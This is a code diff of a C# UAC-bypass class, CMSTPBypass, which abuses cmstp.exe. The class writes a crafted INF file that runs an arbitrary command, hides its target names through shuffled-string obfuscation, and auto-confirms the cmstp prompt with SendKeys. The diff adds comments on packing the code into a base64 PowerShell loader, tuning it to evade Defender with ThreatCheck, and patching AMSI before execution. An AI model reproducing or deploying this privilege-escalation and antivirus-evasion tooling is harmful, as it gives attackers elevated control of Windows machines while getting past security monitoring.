@@ -6,71 +6,22 @@ using System.ComponentModel;
 using System.Collections.Generic;
 using System.Windows;
 using System.Runtime.InteropServices;
- 
+
+// Serialize into Invoke-cmstpUAC.ps1:
+// b64=$(echo -e "gzipB64 = \"$(cat Source_obfs.cs | sed -e 's,//.*$,,g' | sed -re ':a;N;$!ba;s/\n/ /g' -e 's/[ ]+/ /g' | gzip -c | base64 -w0)\";") ;  sed -re "s#gzipB64 =.*;#$b64#g" Invoke-cmstpUAC.ps1 -i
+// For ironing out Defender detections on the DLL:
+// https://github.com/rasta-mouse/ThreatCheck
+// iex Invoke-cmstpUAC.ps1 ; Invoke-cmstpUAC -out  ## writes DLL to \windows\tasks\doosey.dll
+// .\ThreatCheck.exe -f \windows\tasks\doosey.dll -t Bin  ## shows what was detected, its up to you to massage it out
+// Note that, if RealtimeProtection is enabled, you should frontrun execution of the Invoke-cmstpUAC cmdlet with an AMSI bypass, I found that patching amsiOpenSession to return failure (amsiContext[:4] != "AMSI", amsiSession = Intptr.Zero) works.
+
 public class CMSTPBypass
 {
-    private static string InfData = @"[version]
-Signature=$chicago$
-AdvancedINF=2.5
- 
-[DefaultInstall]
-CustomDestination=CustInstDestSectionAllUsers
-RunPreSetupCommands=RunPreSetupCommandsSection
- 
-[RunPreSetupCommandsSection]
-GAMIFIED_WARPANE
-taskkill /IM MARBLED_BEEF /F
- 
-[CustInstDestSectionAllUsers]
-49000,49001=AllUSer_LDIDSection, 7
- 
-[AllUSer_LDIDSection]
-""HKLM"", ""SOFTWARE\Microsoft\Windows\CurrentVersion\App Paths\SemperFi.ini"", ""ProfileInstallPath"", ""%UnexpectedError%"", """"
- 
-[Strings]
-ServiceName=""VPN""
-ShortSvcName=""VPN""
- 
-";
- 
-    [DllImport("user32.dll")] public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
-    [DllImport("user32.dll", SetLastError = true)] public static extern bool SetForegroundWindow(IntPtr hWnd);
- 
-    private static string BP = "c:\\windows\\";
-    private static string xp = "spe3mt2y"; // system32,temp
-    private static string bp = "pste.mcx"; //cmstp.exe
-    private static string gp = "C3R2M.GEX"; // CMMGR32.EXE
-    private static string ep = "{RETN}"; // {ENTER}
-    private static List<int> wonk = new List<int> {6,5,1,2,0,4,3,7,3};     //cmstp.exe @bp
-    private static List<int> ponk = new List<int> {0,4,4,6,2,1,3,5,7,8,7}; //CMMGR32.EXE @gp
-    private static List<int> gonk = new List<int> {0,2,4,3,2,1,5};         //{ENTER} @ep
-    private static List<int> honk = new List<int> {6,5,1,2,0};             //cmstp @bp
-    private static List<int> monk = new List<int> {0,7,0,5,2,4,3,6};       //system32
-    private static List<int> donk = new List<int> {5,2,4,1};               //temp
-
-
-    private static string SetInfFile(string CommandToExecute)
-    {
-        string RandomFileName = Path.GetRandomFileName().Split(Convert.ToChar("."))[0];
-        string TemporaryDir = BP + Shovel(xp,donk);
-        StringBuilder OutputFile = new StringBuilder();
-        OutputFile.Append(TemporaryDir);
-        OutputFile.Append("\\");
-        OutputFile.Append(RandomFileName);
-        OutputFile.Append(".inf");
-        StringBuilder newInfData = new StringBuilder(InfData);
-        newInfData.Replace("GAMIFIED_WARPANE", CommandToExecute);
-        newInfData.Replace("SemperFi.ini", Shovel(gp,ponk));
-        newInfData.Replace("MARBLED_BEEF", Shovel(bp,wonk));
-        File.WriteAllText(OutputFile.ToString(), newInfData.ToString());
-        return OutputFile.ToString();
-    }
-
-    public static bool Execute(string CommandToExecute)
+    public static void Execute(string CommandToExecute)
     {
         if(!File.Exists(BP+Shovel(xp,monk)+"\\"+Shovel(bp,wonk)))
         {
-            return false;
+            Environment.Exit(1);
         }
         StringBuilder InfFile = new StringBuilder();
         InfFile.Append(SetInfFile(CommandToExecute));
@@ -87,7 +38,25 @@ ShortSvcName=""VPN""
         } while (windowHandle == IntPtr.Zero);
 
         System.Windows.Forms.SendKeys.SendWait(Shovel(ep,gonk));
-        return true;
+        File.Delete(InfFile.ToString());
+    }
+
+    private static string SetInfFile(string CommandToExecute)
+    {
+        string RandomFileName = Path.GetRandomFileName().Split(Convert.ToChar("."))[0];
+        string TemporaryDir = BP + Shovel(xp,donk);
+        StringBuilder OutputFile = new StringBuilder();
+        OutputFile.Append(TemporaryDir);
+        OutputFile.Append("\\");
+        OutputFile.Append(RandomFileName);
+        OutputFile.Append(".inf");
+        StringBuilder newInfData = new StringBuilder();
+        foreach (var st in InfData) {newInfData.AppendLine(st);};
+        newInfData.Replace("GAMIFIED_WARPANE", CommandToExecute);
+        newInfData.Replace("SemperFi.ini", Shovel(gp,ponk));
+        newInfData.Replace("MARBLED_BEEF", Shovel(bp,wonk));
+        File.WriteAllText(OutputFile.ToString(), newInfData.ToString());
+        return OutputFile.ToString();
     }
  
     private static IntPtr SetWindowActive(string ProcessName)
@@ -111,4 +80,43 @@ ShortSvcName=""VPN""
         return up;
     }
 
+    [DllImport("user32.dll")] private static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
+    [DllImport("user32.dll", SetLastError = true)] private static extern bool SetForegroundWindow(IntPtr hWnd);
+
+    private static List<string> InfData = new List<string> {
+        "[version]",
+        "Signature=$chicago$",
+        "AdvancedINF=2.5",
+        //" ", 
+        "[DefaultInstall]",
+        "CustomDestination=CustInstDestSectionAllUsers",
+        "RunPreSetupCommands=RunPreSetupCommandsSection",
+        //" ",
+        "[RunPreSetupCommandsSection]",
+        "GAMIFIED_WARPANE",
+        "taskkill /IM MARBLED_BEEF /F",
+        //" ",
+        "[CustInstDestSectionAllUsers]",
+        "49000,49001=AllUSer_LDIDSection, 7",
+        //" ",
+        "[AllUSer_LDIDSection]",
+        "\"HKLM\", \"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\App Paths\\SemperFi.ini\", \"ProfileInstallPath\", \"%UnexpectedError%\", \"\"",
+        //" ",
+        "[Strings]",
+        "ServiceName=\"VPN\"",
+        "ShortSvcName=\"VPN\"",
+        //" "
+    };
+
+    private static string BP = "c:\\windows\\";
+    private static string xp = "spe3mt2yak";    //system32,tasks
+    private static string bp = "pste.mcx";      //cmstp.exe
+    private static string gp = "C3R2M.GEX";     //CMMGR32.EXE
+    private static string ep = "{RETN}";        //{ENTER}
+    private static List<int> wonk = new List<int> {6,5,1,2,0,4,3,7,3};     //cmstp.exe @bp
+    private static List<int> ponk = new List<int> {0,4,4,6,2,1,3,5,7,8,7}; //CMMGR32.EXE @gp
+    private static List<int> gonk = new List<int> {0,2,4,3,2,1,5};         //{ENTER} @ep
+    private static List<int> honk = new List<int> {6,5,1,2,0};             //cmstp @bp
+    private static List<int> monk = new List<int> {0,7,0,5,2,4,3,6};       //system32
+    private static List<int> donk = new List<int> {5,8,0,9,0};             //tasks
 }
